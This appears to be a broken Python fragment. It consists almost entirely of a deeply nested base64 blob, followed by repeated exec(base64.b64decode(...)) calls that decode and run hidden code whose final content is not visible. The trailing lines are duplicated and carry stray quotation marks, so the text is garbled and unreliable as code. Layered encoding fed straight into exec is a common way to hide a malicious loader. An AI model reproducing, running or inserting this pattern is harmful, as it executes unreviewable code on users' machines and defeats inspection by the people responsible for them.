VlhkVE1HUmFZVlpvUlZGWWNFNU5XRTQyVkZSSmVGbHRWWGxVYWtacVltdHdjMWx0TlZOYWJWSklZa2hTWVZkRVJtdFRWVTEzV2pGVmVsVnRhR3RUUmxvMlUxVmFTMkpHYjNsaVNIQnJVMFZ3YjFsNlNuSmFNSGhVVVd0c1YxSnNTbEpYUkVKUFZVWktSbFpVV2twVFNGSTFWMnhrYTJOSFRYcFZiWGhxWWtSc05WZHNhRTlrTWtsNVRsaHdZVlY2VmpaYVJXUkhUVWRTV1ZSdFdscE5hbXh5VjJ4bmQxb3dlRlJSYW1ScVlsWmFkVmxXYUU5TlJuQlpVMjFhYW1KV1dqWlpNR00xWkZkTmVWWllWbWhpYXpVeVdXMXNibU5IV2xka00yUk9aV3MxYVZSVlkzZGhWWFJTWWpCMFNsRXdSbTVUVlU1Q1dqQnNSRkZ1VG1sTmJWSjNXVzEzTldWV2NGbFVibVJwVFdwV05sZHNUa0pQVld4SVpVaGFZVTF0ZURGWFJFNVhaV3h3V1ZOWE9XbFNlbXgxV1Zaak1WcHNjRWhTYWtKYVZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1NuZFhiV3hEWXpKSmVWcElRbWxpUkd3MVYyeG9UMlF5U1hsT1dIQmhWWHBXTmxwRlpFZE5SMUpaVkcxYVdrMXFiSEpYYkU1Q1QxWkNWRkZZYkU1U1JVVXlVVEpzUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4SVZHcEdhbUpyY0hOWmJUVlRXbTFTU0dKSVVtRlZNRVUxVTFWa1UyRkhVa2hXYWtKb1ZucEdjMVJITURGa2JWSTFZVWhrYkZkR1NUSlVSelZUWTBkS1dGWnFXbWxOYWxaelV6Qk9hMUZ0VFhsaVIyaE5UVWhDYjFsVVNrZGxWMUpJVWxjMVRGVXlkREZaZWs1VFpWWndkVlZ1UW1sV01WWjJVMWRzVjFOVk9YQldhelZRWVZaYVZWTlhiSEpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpHcFRSWEIzV1cwMVVtSXhjSEJUYlU1T1VrVXhObFl6Y0U1bGJVcFhaRVJrV2sweFdqVlpNakZYWkZkU1IwOVVRbWhXZWtaeldteFpkMW93ZUZSUmJFWnFZbFJzTmxkc2FFNWFNa3BJVDFjMWFGWjZVbTVVUms1RFUxWmFSMVZzUmxsTlJUVlJWV3RXVms1cmJFbGtTRTVwVFcxU2QxbHRkelZsVm5CWlZHNWthVTFxVmpaWGJFMHhaVzFTU0ZKcVFtdFhSVFZ0VjFSSk5XRXhjRmxOVjA1T1VrVXhObFl6Y0VOa1JXeHdZVEIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVdXdGpOV0p0UmxoT1YxcGhVakJaZDFkV1RrSlBWV3hJWlVoYVlVMXRlREZYUkU1TFlrZE5lbEZ1V21saWF6VnpWRWN4ZDJWdFNYbE9SemxNVlZjNWJsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNURZVVpyZVZSdGVHcE5NRFZ0V2tWak5XTnNjRmhPUjJSUlZUQktlbGxxU210alIwcHpUMWQwV2xkR1NtOVdNMnhyWVRGc1dWVnRhRXROVkVacFUycEtSMkZzYTNsV2JuQnFUVlpLTWxsVVNsZGtWVzk0VFVWMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVVEpzUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVZGZGtWazF0ZURCWk1HUkhaRlZzU1ZadWNHRlhSWEF4VjFaamVHSkZlRVJSYlhocFZqQmFkMWxyVGpOYU1rNUlVbTV3YWsweVVqSlpNakZTWXpCc1NGVnRhR2xoVlVwdlYxUktUMkpIVFhwVVYyUnJVbnBzZVZkc1l6QmFNa1Y1Vmxka1lXSlhlSHBYYkU1RFlVZEZlbFp1VmsxaWJFa3dXa1ZHZGxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXcE9hRmRHU25aVFZXTTFaREZ3V0U1SE9WcFdNMUY0V1cxM05XSlhSbGhsUjNoWlRUQktiMXBGWkc1ak1HeEVXa2RvUzJWWGRHNVhWbWhPV2pGc1dHUkVSbWxpUkd4MFdWWmtOR0pGT1c1aU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqRnNXR1JFUm1saVJHeDBXVlprTkdKRmVIVmFTR3hvVjBaS2MxTXdaRnBoVmxwWlZHMTRhbUpVVm05WmJHUldUbXRzU1dSRVJtcE5iRm8xV1cweFIyUkdjRmxOU0U1S1VsWmFNRmRXWkhOak1EbHdVV3BrWVUxc1dqRlhiR2hMWVVkU1NGWnRkRmxOYkZvd1YxWmtjMk15V2xSa01tUldVakJhTmxsNlRtdGtiVTUwVlZSYVNsTklVak5YVm1oUFpXMVJlVTlZYkdGVFJFSjZVMVZXUjJGc2EzbFdibkJxVFZaS01sbFVTbGRrVlRsd1VXcGtXbFl3TlhGWGJHaFBaV3huZWxWdVdtaE5iRm94V214YU5HUlZiSEJoTUhSRVlWVkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVPV2pGVmVXSklVbXBTTUZveFUxVmtSMkZzYTNsV2JuQnFaVlZKZDFscVNqQmlSMHB3VVc1S1lWVXdTblJaVm1RMFlrVnNTVlZ1V21oTmJGb3hWRWMxVTA1SFVrSmlNbVJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3U1hwWlZtaFRZakJzU0U5WVpHRldlbEoyV2tWak5XTnNjRmhPVjFwaFlsZDRlbGRzV1RWa01XeFpWVzA1VFZFd1JuVlhWazVxWTBWc1NGSnVjRXBUUmtveVdWUktWMlJXWjNsWGJrSnBVakZWTWxFeWJFSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FbDNXV3BLTUdKSFNuTlBWekZvVmpOb2MxUkhOV3RsVjBaWlZXMTRURkl4YkhCYVZFcEhZV3hyZVZadWNHcE5WR3QzV1dwS01HSkhTblZOVjA1cFlWVnNkMUV5WkhaYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhjR3BpVmxvMldUQmpOV1JWYkVoVGJYaHFZbGRvYjFsNlNuTmpNRTV3VVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwVFJVbzFXVlpqTVUxRmRFaFhWMnhaVWtWR05sUlVSbnBsYXpGMFRWZEtiRTFyTkhoWk1qVkxZa2RLZFZWdFdtdFNNbmd3VjJ4bmVGcEZiRVJOUjJSV1VqRmFNRmRYTlZkaFIxSklVbTVXU2xKVldubGFSbU13V2pGc2RGWnViR2hTTUZvMldWWmtORmt3TVVWVVdIQllaV3RLTUZOWGJISlRNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkdwVFJYQjNXVzAxVW1JeGNIQlRiVTVPVWtVeE5sWXpjRTVsVjBwWFpFUmtXazB4V2pWWk1qRlhaRmRTUjA5VVFtaFdla1p6V214WmQxb3dlRlJSYkZwcVRXeGFOVmx0TVVka1JuQlZZakprYkUweFdqWlhiR2hMWkZac1dFMVhlRzFWTUVZd1UxVldWMlJHYkZoaVNFNVFZVlZKTTFkcVNsZGtWbkJaVTIxb2ExSXhXbkpYUkVwWFpFWnNXR0pJVG0xVk1FWXdVMVZhUTJGSFRYcFVhazVwVFRCd2NsUXliRU5PTWs1SVVtNXdhazB5VWpKWk1qRlRUMVpvUlZGWWNFNU5XRTR6V1d4T1NtTkZUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xORlNqVlpWbU14VFVWMFNGZFhiRmxTUlVZMlZGUkdlbVZyTVhSTlYwcHNUV3MwZUZreU5VdGlSMHAxVlcxYWExSXllREJYYkdkNFdrVnNSRTFIWkZKV01EVnhWMnhvVDJWc1draFBXRXBoVm5wUk1sTlZhREJoUm10NVZHMTRhazB3TlcxYVJXTTFZMnh3V0U1VWJGbFNSVVkyVkZSR2VtUXlTbFJUV0VKRVlWVkdibE5WVGtKYU1HeEVVVmRrWVZZemFEWlhiRkoyVXpCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUmFUVEZhTlZreU1WZGtWMUpIVDFSQ2FGWjZSbk5UVlZGM1dqRndTRkpxUW1GWFJrcDNXV3hrVm1SWFNuUlBWRTVNVTBWSk1WcEZhSFprVjFKSVlraFNZVmRJUWpKWmJURldZakJ2ZDFKdWNHaFdNRll5VlRJeFIyTnNiRmxUYWtKYVZUSk9kMU14VFRGbGJWSkpVMjB4YTFJeWVEQlhiRTV1WVZWd1ZscDZXa3RXVkVFeVUyeGFUbUZWZEZKaU1tUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdTak5aTWpGelpGZFNSR0ZITVVwaVNHUXpWRmh3VDFsck1UWlNibEpZVFROU2NWcEdhRXRsVm5CWVRsUkNXVTB4U25kWmJHUlhUMVpvVkZGWVVrcFNXR2d5VjJwS2MyUlZiRWhYYldob1ZqTm9jMWRyVGtOTk1rWlpWVzA1U2xKWGFGWldhMXBEV214RmQwOVZWbE5XUnpsdVdsUktOR1JzYjNsaVNGWlpUVEJ3YzFsNlRrTmtiVXAxVkcxNFRXSnJOSGRYVm1oVFRWZE5lRTlYY0dsTmJFcHpXbXhhTTJRd01UWlViVXBPVW5wQ2NGTXhSblphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdVpHcGlWM2d4V2tWT2IyTXlTWGxhU0VKcFlrUnNOVmRzYUU5a01rbDVUbGh3WVZWNlZYZFhiR2h2VFVWMFVtSXlaRXBSTUVadVYyeGtOR1ZzY0ZWaU1IUktVVEJHYmxOVlRrSmFNR3hFVVcxd2ExZEZjRFZYYkdNeFRVWm5lbFZ1UW1sV01WWnVWVVpPUTJFeGJGbFZiWGhyVWpKNE1GZHNUVEZrVjBsNldUSTVhbE5IZDNkYVYyc3hUVWRHV0UxWGVHeGlWR3d4VjJ4T2JtSnNSbGxVYmtKYVZYcHNURmRXWkRCaFIwNTFWVzFvUzJWWGRIZFVSelZQVFVkT2RGZHFRbWhXZWtaelV6Qk9TbUpHVGtWaU1uaFZWa2M1YzFaWWJFcGpSVTV3VVZka1NsRXdSbTVUVlU1Q1dqSk9TVk51UW1saWJFWjJWMjFzUzFrd01VVlVXSEJZWldzeE5GbHNXakJPTVd0NlZtNXNhbUpXV2pGYVJWazFUVWRHV0UxWGVHMVdha0p1VkVaT1ExVXhjRmhhU0VKcVRURktOVmRXYUZOalIwbDVUa2RrWVdKVlduZFphMlJYWVRCc1NWcElRbXRTTW1SdVZUQmFVMVpXVmtkUFZWSlZUVVpLUjFReWJFTk9NazUwVm0wMWFGZEZOSGRYYkdoTFdtMU9kRlp1Y0dwU2Vtd3hXWHBLVm1SWFRYcFZiV2hyVTBaYU5sZEVTazlrYkhCSVZtcHNXVkpGUmpaVVZFWjZaREpLVkZOWVFrUmhWVVp1VTFWT1Fsb3diRVJSVjJScVUwVndkMWx0TlZKaU1rNTBWbTAxYUZkRk5IZFhiR2hMV20xT2RGWnVjR3BTZW13eFdYcEtWbVJYVWtoV2FsSnJVVEowVEZOVlRrNWFNR3hFVVdwQ2FGWjZSbk5VUnpWUFl6RndXRlp1WkV4U1JWWjNVMVZPUW1GcmJFWk5WM2hwWWxWYU1GZFhNVWRpTWtWNVVtNVdTbEl6UW5OWGEyUkdXakF4VkZGdGRHRlhSa3AzV1Zoc1EyRkhTblZWYldocVlWVktkMXBGWkZkbFZteFpWRzVDUkZwNk1EbEpaM0JzWlVkV2FrdEhTbWhqTWxVeVRrTTFhVTVxVW10YVYwNTJXa2RWYjFwWE5XcGlNbEpzV2tZNWVsa3pTbkJqU0ZGd1RHMVNiRmt5T1d0YVUyZHVaRmhTYlV4VVoyNUxVMnM5SWdwbGVHVmpLR0poYzJVMk5DNWlOalJrWldOdlpHVW9aVzVqYjJSbFpGOXpZM0pwY0hRcExtUmxZMjlrWlNnbmRYUm1MVGduS1NrPSIKZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfc2NyaXB0KS5kZWNvZGUoJ3V0Zi04Jykp"
exec(base64.b64decode(encoded_script).decode('utf-8'))"
exec(base64.b64decode(encoded_script).decode('ascii'))
